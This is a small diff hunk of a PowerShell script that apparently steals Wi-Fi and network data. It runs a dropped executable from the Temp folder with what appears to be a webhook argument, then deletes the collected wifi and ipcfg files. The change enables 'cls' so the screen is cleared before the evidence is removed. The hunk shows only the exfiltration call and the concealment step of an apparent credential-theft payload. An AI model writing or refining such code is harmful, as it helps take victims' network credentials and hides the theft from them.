@@ -49,7 +49,7 @@ Write-Output $wh
 & "$env:LOCALAPPDATA\Temp\fun.exe" --wh $wh
 
 # cleanup
-#cls
+cls
 Start-Sleep -Seconds 3
 Remove-Item -Path "$wifiFile" -Force
 Remove-Item -Path "$e\ipcfg.txt" -Force
